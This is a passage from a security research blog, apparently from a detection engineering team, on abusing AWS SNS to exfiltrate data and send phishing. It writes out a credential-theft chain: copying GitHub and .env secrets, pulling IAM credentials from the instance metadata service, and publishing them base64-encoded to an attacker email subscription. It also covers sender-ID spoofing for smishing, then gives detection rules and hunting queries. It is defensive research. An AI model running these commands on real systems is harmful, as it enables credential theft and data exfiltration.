execution.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"the-workflow-in-practice-exfiltrating-sensitive-credentials\",children:\"The Workflow in Practice: Exfiltrating Sensitive Credentials\"}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s step through this workflow in practice, now that our infrastructure is established. As a reminder, the goal of our opportunistic adversary is to check for local credentials, grab what they can and stage the sensitive data locally. Since landing on this EC2 instance, we have identified the AWS CLI exists, and identified we have SNS permissions. Thus, we plan to create a SNS topic, register an external email as a subscriber and then exfiltrateour stolen credentials and other data as SNS messages.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Note: While this example is extremely simple, the goal is to focus on SNS as a methodology for exfiltration. The exact circumstances and scenario will differ depending on the specific infrastructure setup of the victim.\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Identify and Collect Credentials from Common Locations:\"}),(0,i.jsx)(e.br,{}),`\n`,\"Our adversary will target GitHub credentials files and .env files locally with some good ol\\u2019 fashioned Bash scripting. This will take the credentials from these files and drop them into the \",(0,i.jsx)(e.code,{children:\"/tmp\"}),\" temporary folder, staging them for exfiltration.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Command: cat /home/ubuntu/.github/credentials /home/ubuntu/project.env \u003e /tmp/stolen_creds.txt\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image11.png\",alt:\"\",width:\"1999\",height:\"355\"})}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Stage Exfiltration Method by Creating SNS Topic\"}),(0,i.jsx)(e.br,{}),`\n`,\"Let\\u2019s leverage the existing AWS CLI to create the SNS topic. As a reminder, this EC2 instance assumes the custom IAM role we created and attached, which allows it to create SNS topics and publish messages. Since the AWS CLI is pre-installed on our EC2 instance, it will retrieve temporary credentials from IMDSv2 for the assumed role when invoked. However, if this were not the case, an adversary could retrieve credentials natively with the following bash code.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`# Fetch the IMDSv2 token\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n\n# Get the IAM role name\nROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n\n# Fetch the temporary credentials\nCREDENTIALS=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)\n\n# Extract the Access Key, Secret Key, and Token\nAWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nAWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nAWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Token')\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Once this is complete, let\\u2019s attempt to create our SNS topic and the email address that will be used as our external receiver for the exfiltrated data.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Create Topic Command: \",(0,i.jsx)(e.code,{children:`TOPIC_ARN=$(aws sns create-topic --name \"whitebox-sns-topic\" --query 'TopicArn' --output text)`})]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Subscribe Command: \",(0,i.jsx)(e.code,{children:'aws sns subscribe --topic-arn \"$TOPIC_ARN\" --protocol email --notification-endpoint \"adversary@protonmail.com\"'})]}),`\n`,(0,i.jsxs)(e.p,{children:[\"As shown above after the commands are run, we can then navigate to the inbox of the external email address to confirm subscription. Once confirmed, our external email address will now receive any messages sent to the \",(0,i.jsx)(e.code,{children:\"whitebox-sns-topic topic\"}),\" which we plan to use for exfiltration.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image9.png\",alt:\"\",width:\"1654\",height:\"664\"})}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Exfiltrate Data via SNS Publish\"}),(0,i.jsx)(e.br,{}),`\n`,\"At this point, we have gained access to an EC2 instance, snooped around to understand our environment, identified some services for abuse and some credentials that we want to obtain. Note that our previous steps could all have been accomplished via a simple Bash script that could be dropped on the compromised EC2 instance via our webshell, but this is broken down into individual steps for example purposes..\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Next, we can take the data we stored in \",(0,i.jsx)(e.code,{children:\"/tmp/stolen_creds.txt\"}),\", base64 encode it and ship it to our adversary controlled email address via SNS.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Commands:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Base64 encode contents: \",(0,i.jsx)(e.code,{children:\"BASE64_CONTENT=$(base64 /tmp/stolen_creds.txt)\"})]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Publish encoded credentials to our topic: \",(0,i.jsx)(e.code,{children:'aws sns publish --topic-arn \"$TOPIC_ARN\" --message \"$BASE64_CONTENT\" --subject \"Encoded Credentials from EC2\"'})]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image7.png\",alt:\"\",width:\"1999\",height:\"252\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Once completed, we can simply check our inbox for these exfiltrated credentials.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image1.png\",alt:\"\",width:\"1999\",height:\"495\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Taking the payload from our message, we can decode it to see that it represents the credentials we found lying around on the EC2 instance.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image6.png\",alt:\"\",width:\"1644\",height:\"516\"})}),`\n`,(0,i.jsx)(e.p,{children:\"As many adversaries may attempt to establish persistence or laterally move throughout the AWS environment and services, they would then be able to rely on this SNS topic to exfiltrate data for as long as permissions were in scope for the IAM user or role. Additionally, they could set up a recurring job that scans for data on this EC2 instance and continually exfiltrates anything interesting over time. There are many practical options in this scenario for additional chaining that could be done.\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Before continuing, we encourage you to use the following command to destroy your infrastructure once logging out of the SSH connection\"}),\": \",(0,i.jsx)(e.code,{children:\"terraform destroy --auto-approve\"})]}),`\n`,(0,i.jsx)(e.h3,{id:\"challenges-for-adversaries\",children:\"Challenges for Adversaries:\"}),`\n`,(0,i.jsx)(e.p,{children:\"Of course, there are many uncertaintiesin any whitebox testing that may prove as roadblocks or hurdles for a TA, both advanced and immature in knowledge, skills and abilities. It is also very dependent on the configuration and environment of the potential victim. Below are additional challenges that adversaries would face.\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Initial Access\"}),\": Gaining initial access to the EC2 instance is often the biggest hurdle. This could involve exploiting a vulnerable web application or 3rd-party service, using stolen SSH credentials, password spraying or credential stuffing, or leveraging other means such as social engineering or phishing. Without initial access, the entire attack chain is infeasible.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Establishing an Active Session\"}),\": After gaining access, maintaining an active session can be difficult, especially if the environment includes robust endpoint protection or regular reboots that clear unauthorized activity. Adversaries may need to establish a persistent foothold using techniques like a webshell, reverse shell or an automated dropper script.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"AWS CLI Installed on the Instance\"}),\": The presence of the AWS CLI on a public-facing EC2 instance is uncommon and not considered a best practice. Many secure environments avoid pre-installing the AWS CLI, forcing adversaries to bring their own tools or rely on less direct methods to interact with AWS services.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"IAM Role Permissions\"}),\": The IAM role attached to the EC2 instance must include permissive policies for SNS actions (\",(0,i.jsx)(e.code,{children:\"sns:Publish\"}),\", \",(0,i.jsx)(e.code,{children:\"sns:Subscribe\"}),\", \",(0,i.jsx)(e.code,{children:\"sns:CreateTopic, sts:GetCallerIdentity\"}),\"). Many environments restrict these permissions to prevent unauthorized use, and misconfigurations are often necessary for the attack to succeed. Best security practices such as principle-of-least-privilege (PoLP) would ensure the roles are set up with only necessary permissions.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"Execution of Malicious Scripts\"}),\": Successfully executing a script or running commands without triggering alarms (e.g., CloudTrail, GuardDuty, EDR agents) is a challenge. Adversaries must ensure their activities blend into legitimate traffic or use obfuscation techniques to evade detection.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"advantages-for-adversaries\",children:\"Advantages for Adversaries\"}),`\n`,(0,i.jsx)(e.p,{children:\"Of course, while there are challenges for the adversary with these techniques, let\\u2019s consider some crucial advantages that they may have as well.\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Blending In with Native AWS Services\"}),\": By leveraging AWS SNS for data exfiltration, the adversary's activity appears as legitimate usage of a native AWS flagship service. SNS is commonly used for notifications and data dissemination, making it less likely to raise immediate suspicion.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Identity Impersonation via IAM Role\"}),\": Actions taken via the AWS CLI are attributed to the IAM role attached to the EC2 instance. If the role already has permissions for SNS actions and is used regularly for similar tasks, adversarial activity can blend seamlessly with expected operations.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"No Concerns with Security Groups or Network ACLs\"}),\": Since SNS communication occurs entirely within the confines of AWS, there\\u2019s no reliance on security group or Network ACL configurations. This bypasses traditional outbound traffic controls, ensuring the adversary's data exfiltration attempts are not blocked.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Lack of Detections for SNS Abuse\"}),\": Abuse of SNS for data exfiltration is under-monitored in many environments. Security teams may focus on more commonly abused AWS services (e.g., S3 or EC2) and lack dedicated detections or alerts for unusual SNS activity, such as frequent topic creation or large volumes of published messages.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Minimal Footprint with Non-Invasive Commands\"}),\": Local commands used by the adversary (e.g., \",(0,i.jsx)(e.code,{children:\"cat\"}),\", \",(0,i.jsx)(e.code,{children:\"echo\"}),\", \",(0,i.jsx)(e.code,{children:\"base64\"}),\") are benign and do not trigger endpoint detection and response (EDR) tools typically. These commands are common in legitimate administrative tasks, allowing adversaries to avoid detection on backend Linux systems.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Efficient and Scalable Exfiltration\"}),\": SNS enables scalable exfiltration by allowing adversaries to send large amounts of data to multiple subscribers. Once set up, the adversary can automate periodic publishing of sensitive information with minimal additional effort.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Persistent Exfiltration Capabilities\"}),\": As long as the SNS topic and subscription remain active, the adversary can use the infrastructure for ongoing exfiltration. This is especially true if the IAM role retains its permissions and no proactive monitoring is implemented.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Bypassing Egress Monitoring and DLP\"}),\": Since the data is exfiltrated through SNS within the AWS environment, it bypasses traditional egress monitoring or data loss prevention solutions that focus on outbound traffic to external destinations.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.h1,{id:\"in-the-wild-abuse\",children:\"In-the-Wild Abuse\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"While whitebox scenarios are invaluable for simulating potential adversarial behaviors, it is equally important to ground these simulations with in-the-wild (ItW) threats. To this end, we explored publicly available research and identified a \",(0,i.jsx)(e.a,{href:\"https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/\",rel:\"nofollow\",children:\"key article\"}),\" from SentinelOne describing a spam messaging campaign that leveraged AWS SNS. Using insights from this research, we attempted to replicate these techniques in a controlled environment to better understand their implications.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Although we will not delve into the attribution analysis outlined in SentinelOne\\u2019s research, we highly recommend reviewing their work for a deeper dive into the campaign\\u2019s origins. Instead, our focus is on the tools and techniques employed by the adversary to abuse AWS SNS for malicious purposes.\"}),`\n`,(0,i.jsx)(e.h2,{id:\"smishing-and-phishing\",children:\"Smishing and Phishing\"}),`\n`,(0,i.jsx)(e.p,{children:\"Compromised AWS environments with pre-configured SNS services can serve as launchpads for smishing (SMS phishing) or phishing attacks. Adversaries may exploit legitimate SNS topics and subscribers to distribute fraudulent messages internally or externally, leveraging the inherent trust in an organization\\u2019s communication channels.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"As detailed in SentinelOne\\u2019s \",(0,i.jsx)(e.a,{href:\"https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/\",rel:\"nofollow\",children:\"blog\"}),\", the adversary employed a Python-based tool known as \",(0,i.jsx)(e.strong,{children:\"SNS Sender\"}),\". This script enabled bulk SMS phishing campaigns by interacting directly with AWS SNS APIs using compromised AWS credentials. These authenticated API requests allowed the adversary to bypass common safeguards and send phishing messages in mass..\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The \",(0,i.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/6d8c062c23cb58327ae6fc3bbb66195b1337c360fa5008410f65887c463c3428\",rel:\"nofollow\",children:(0,i.jsx)(e.strong,{children:\"SNS Sender script\"})}),\" leverages valid AWS access keys and secrets to establish authenticated API sessions via the AWS SDK. Armed with these credentials, adversaries can craft phishing workflows that include:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Establishing authenticated SNS API sessions via the AWS SDK.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Enumerating and targeting lists of phone numbers to serve as phishing recipients.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Utilizing a pre-registered Sender ID (if available) for spoofing trusted entities.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Sending SMS messages containing malicious links, often impersonating a legitimate service.\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/aws-sns-abuse/image4.png\",alt:\"\",width:\"819\",height:\"633\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Elastic Security Labs predicts that the use of one-off or commercially available tools for abusing cloud services, like SNS Sender, will continue to grow as a research focus. This underscores the importance of understanding these tools and their impact on cloud security.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"weaponization-and-pre-testing-considerations\",children:\"Weaponization and Pre-Testing Considerations\"}),`\n`,(0,i.jsx)(e.p,{children:\"To successfully execute a phishing campaign at scale using AWS SNS, the adversary would have needed access to an already registered AWS End User Messaging organization. AWS restricts new accounts to SNS Sandbox Mode, which limits SMS sending to manually verified phone numbers. To bypass sandbox restrictions, adversaries would need access to an account already approved for production SMS messaging. The process of testing and weaponization would have required several key steps.\"}),`\n`,(0,i.jsx)(e.p,{children:\"A fully configured AWS End User Messaging setup would require:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"An established origination identity (which includes a long code, toll-free number, or short code).\"}),`\n`,(0,i.jsx)(e.li,{children:\"Regulatory approval through a brand registration process.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Carrier pre-approval for high-volume SMS messaging.\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Without these pre-registered identifiers, AWS SNS messages may be deprioritized, blocked, or fail to send.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Before deploying a large-scale attack, adversaries would likely test SMS delivery using verified phone numbers within AWS SNS Sandbox Mode. This process requires:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Manually verifying phone numbers before sending messages.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Ensuring their carrier allows AWS SNS sandbox messages, as some (like T-Mobile and Google Voice) frequently block AWS SNS sandbox verification SMS.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Testing delivery routes across different AWS regions to identify which countries permit custom Sender IDs or allow non-sandbox messages.\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"If an attacker\\u2019s test environment failed to receive SNS verification OTPs, they would likely pivot to a different AWS account or leverage a compromised AWS account that already had production-level messaging permissions.\"}),`\n`,(0,i.jsx)(e.p,{children:\"In addition to this, the adversary would likely prioritize transactional messages over promotional. Transactional messages are prioritized by AWS (OTPs, security alerts, etc.) - whereas promotional messages are lower priority and may be filtered or blocked by certain carriers.\"}),`\n`,(0,i.jsx)(e.p,{children:\"If adversaries cannot override message type defaults, their phishing messages may be deprioritized or rejected by AWS, which could be a hurdle.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:\"Registered Origination Identity \u0026 Sender ID (If Supported)\"})}),`\n`,(0,i.jsx)(e.p,{children:\"AWS requires brand registration and origination identity verification for businesses sending high-volume SMS messages. Depending on the region and carrier, adversaries may be able to exploit different configurations:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Sender ID Abuse\"}),\": In some non-U.S. regions, adversaries could register a Sender ID to make phishing messages appear from a trusted entity. This may allow for spoofing banks, shipping companies, or government agencies, making the phishing attempt more convincing.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Long Code \u0026 Toll-Free Exploitation\"}),\": AWS SNS assigns long codes (standard phone numbers) or toll-free numbers for outbound SMS. Toll-free numbers require registration but could still be abused if an adversary compromises an AWS account with an active toll-free messaging service.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Short Code Restrictions\"}),\": High-throughput short codes (5- or 6-digit numbers) are often carrier-controlled and require additional vetting, making them less practical for adversaries.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.h3,{id:\"infrastructure-setup-1\",children:(0,i.jsx)(e.strong,{children:\"Infrastructure Setup\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"By default, AWS accounts that have not properly configured the \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sms-voice/latest/userguide/what-is-sms-mms.html\",rel:\"nofollow\",children:\"End User Messaging\"}),\" service are restricted to an \",(0,i.jsx)(e.a,{href:\"https://aws.amazon.com/blogs/compute/introducing-the-sms-sandbox-for-amazon-sns/\",rel:\"nofollow\",children:(0,i.jsx)(e.strong,{children:\"SMS sandbox\"})}),\". This sandbox allows developers to test SMS functionality by sending messages to verified phone numbers. However, as we discovered, the process of verifying numbers in the sandbox is fraught with challenges.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Despite repeated attempts to register phone numbers with the sandbox, we found that verification messages (OTP codes) failed to arrive at endpoints across various carriers and services, including Google Voice and Twilio. This suggests that mobile carriers may block these sandbox-originated messages, effectively stalling the verification process but ultimately blocking us from emulating the behavior.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"For production use, \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/dg/sns-sms-sandbox-moving-to-production.html\",rel:\"nofollow\",children:\"migrating\"}),\" from the sandbox requires a fully configured AWS End User Messaging service. This includes:\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"A legitimate Sender ID.\"}),`\n`,(0,i.jsx)(e.li,{children:\"A phone pool for failovers.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Origination identity.\"}),`\n`,(0,i.jsx)(e.li,{children:\"Brand registration for regulatory compliance.\"}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This setup aligns with the requirements of the SNS Sender script and represents an ideal environment for adversaries. The use of a Sender ID, which relies on a pre-established \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/dg/channels-sms-originating-identities.html\",rel:\"nofollow\",children:\"origination identity\"}),\" and brand registration, allows phishing messages to appear as though they originate from a reputable organization. This reduces the likelihood of detection or carrier-level blocking, increasing the success rate of the campaign.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"The requirements for this attack suggests adversaries are likely to target companies that use AWS End User Messaging for automated SMS alerts and messaging. Industries such as logistics and delivery services, e-commerce platforms, and travel and hospitality are prime targets due to their reliance on automated SMS notifications.\"}),`\n`,(0,i.jsx)(e.p,{children:\"On the recipient's side, the phishing message appears as if it originates from a trusted entity, bypassing carrier alarms and evading suspicion.\"}),`\n`,(0,i.jsx)(e.p,{children:\"During our testing, we encountered unexpected behavior with logging in CloudTrail when attempting to use the script and AWS CLI to send SMS messages directly through SNS. Failed message delivery attempts did not appear in CloudTrail logs as expected.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Although the \",(0,i.jsx)(e.a,{href:\"https://docs.aws.amazon.com/sns/latest/api/API_Publish.html\",rel:\"nofollow\",children:(0,i.jsx)(e.strong,{children:\"Publish\"})}),\" API call is generally logged in CloudTrail (provided data plane events are enabled), it remains unclear if the absence of logs for failed attempts was due to inherent SNS behavior or misconfiguration on our part. This gap highlights the need for deeper investigation into how failed SNS Publish requests are handled by AWS and whether additional configurations are required to capture these events reliably.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"As a result, we determined it would be best to include a threat hunting query for this rather than a detection rule due to the inability to fully replicate the adversary behavior, reliance on pre-established and registered brands and origination identity, in full.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"detection-and-hunting-opportunities\",children:\"Detection and Hunting Opportunities\"}),`\n`,(0,i.jsx)(e.p,{children:\"For detection and hunting, CloudTrail audit logs provide enough visibility for the subsequent API calls from this activity. They also include enough contextual information to help aid with a higher fidelity of these anomalous signals. The following detections and hunting queries will leverage CloudTrail data ingested into our Elastic stack with the AWS CloudTrail integration, however they should be translatable to the SIEM of your choice if needed. For this activity, we focus solely on assumed roles, specifically those with EC2 instances being abused but this could take place elsewhere in AWS environments.\"}),`\n`,(0,i.jsx)(e.h2,{id:\"sns-topic-created-by-rare-user\",children:\"SNS Topic Created by Rare User\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/c5523c4d4060555e143b2d46fea1748173352b8f/rules/integrations/aws/resource_development_sns_topic_created_by_rare_user.toml\",rel:\"nofollow\",children:\"Detection Rule Source\"}),(0,i.jsx)(e.br,{}),`\n`,(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_topic_created_by_rare_user.md\",rel:\"nofollow\",children:\"Hunting Query Source\"}),(0,i.jsx)(e.br,{}),`\n`,\"MITRE ATT\u0026CK: \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1608/\",rel:\"nofollow\",children:\"T1608\"})]}),`\n`,(0,i.jsx)(e.p,{children:\"Identifies when an SNS topic is created by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic\\u2019s New Terms type rules to identify when the first occurrence of a user identity ARN creates an SNS topic. It would be awfully unusual for an assumed role, typically leveraged for EC2 instances to be creating SNS topics.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Our query leverages KQL and \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/rules-ui-create.html#create-new-terms-rule\",rel:\"nofollow\",children:\"New Terms rule type\"}),\" to focus on topics created by an Assumed Role specifically for an EC2 instance.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`event.dataset: \"aws.cloudtrail\"\n    and event.provider: \"sns.amazonaws.com\"\n    and event.action: \"Publish\"\n    and aws.cloudtrail.user_identity.type: \"AssumedRole\"\n    and aws.cloudtrail.user_identity.arn: *i-*\n`})}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-query-esql\",children:\"Hunting Query (ES|QL)\"}),`\n`,(0,i.jsx)(e.p,{children:\"Our hunting query focuses on the CreateTopic API action from an entity whose identity type is an assumed role. We also parse the ARN to ensure that it is an EC2 instance this request is sourcing from. We can then aggregate on cloud account, entity (EC2 instance ID), assumed role name, region and user agent. If it is unusual for the EC2 instance reported to be creating SNS topics randomly, then it may be a good anomalous signal to investigate.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`from logs-aws.cloudtrail-*\n| where @timestamp \u003e now() - 7 day\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Publish\"\n    and aws.cloudtrail.user_identity.type == \"AssumedRole\"\n| DISSECT aws.cloudtrail.request_parameters \"{%{?message_key}=%{message}, %{?topic_key}=%{topic_arn}}\"\n| DISSECT aws.cloudtrail.user_identity.arn \"%{?}:assumed-role/%{assumed_role_name}/%{entity}\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| WHERE STARTS_WITH(entity, \"i-\")\n| STATS regional_topic_publish_count = COUNT(*) by cloud.account.id, entity, assumed_role_name, topic_arn, cloud.region, user_agent_name\n| SORT regional_topic_publish_count ASC\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Hunting Notes:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"It is unusual already for credentials from an assumed role for an EC2 instance to be creating SNS topics randomly.\"}),`\n`,(0,i.jsx)(e.li,{children:\"If a user identity access key (aws.cloudtrail.user_identity.access_key_id) exists in the CloudTrail audit log, then this request was accomplished via the CLI or programmatically. These keys could be compromised and warrant further investigation.\"}),`\n`,(0,i.jsx)(e.li,{children:\"An attacker could pivot into Publish API actions being called to this specific topic to identify which AWS resource is publishing messages. With access to the topic, the attacker could then further investigate the subscribers list to identify unauthorized subscribers.\"}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"sns-topic-subscription-with-email-by-rare-user\",children:\"SNS Topic Subscription with Email by Rare User\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/exfiltration_sns_email_subscription_by_rare_user.toml\",rel:\"nofollow\",children:\"Detection Rule Source\"}),(0,i.jsx)(e.br,{}),`\n`,(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/7fb13f8d5649cbcf225d2ade964bdfef15ab6b11/hunting/aws/docs/sns_email_subscription_by_rare_user.md\",rel:\"nofollow\",children:\"Hunting Query Source\"}),(0,i.jsx)(e.br,{}),`\n`,\"MITRE ATT\u0026CK: \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1567/\",rel:\"nofollow\",children:\"T1567\"}),\", \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1530/\",rel:\"nofollow\",children:\"T1530\"})]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Identifies when an SNS topic is subscribed to by a rare AWS user identity ARN (IAM User or Role). This detection leverages Elastic\\u2019s \",(0,i.jsx)(e.strong,{children:\"New Terms\"}),\" type rules to identify when the first occurrence of a user identity ARN attempts to subscribe to an existing SNS topic.The data exfiltration which took place during our whitebox testing example above would have been caught by this threat hunt; an alert would have been generated when we establish an SNS subscription to an external user.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Further false-positive reductions could be obtained by whitelisting expected organization TLDs in the requested email address if the topic is meant for internal use only.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Our query leverages KQL and New Terms rule type to focus on subscriptions that specify an email address. Unfortunately, CloudTrail redacts the email address subscribed or this would be vital for investigation.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`event.dataset: \"aws.cloudtrail\"\n    and event.provider: \"sns.amazonaws.com\"\n    and event.action: \"Subscribe\"\n    and aws.cloudtrail.request_parameters: *protocol=email*\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.strong,{children:\"New Terms value\"}),\": aws.cloudtrail.user_identity.arn\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-query-esql-1\",children:\"Hunting Query (ES|QL)\"}),`\n`,(0,i.jsx)(e.p,{children:\"Our hunting query leverages ES|QL but parses the Subscribe API action parameters to filter further on the email protocol being specified. It also parses out the name of the user-agent, but relies further on aggregations to potentially identify other anomalous user-agent attributes. We've also included the region where the subscription occurred, as it may be uncommon for certain regions to be subscribed to others, depending on the specific business context of an organization.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`from logs-aws.cloudtrail-*\n| where @timestamp \u003e now() - 7 day\n| WHERE\n    event.dataset == \"aws.cloudtrail\" AND\n    event.provider == \"sns.amazonaws.com\" AND\n    event.action == \"Subscribe\"\n| DISSECT aws.cloudtrail.request_parameters \"%{?protocol_key}=%{protocol}, %{?endpoint_key}=%{redacted}, %{?return_arn}=%{return_bool}, %{?topic_arn_key}=%{topic_arn}}\"\n| DISSECT user_agent.original \"%{user_agent_name} %{?user_agent_remainder}\"\n| WHERE protocol == \"email\"\n| STATS regional_topic_subscription_count = COUNT(*) by aws.cloudtrail.user_identity.arn, cloud.region, source.address, user_agent_name\n| WHERE regional_topic_subscription_count == 1\n| SORT regional_topic_subscription_count ASC\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Hunting Notes:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"If a user identity access key 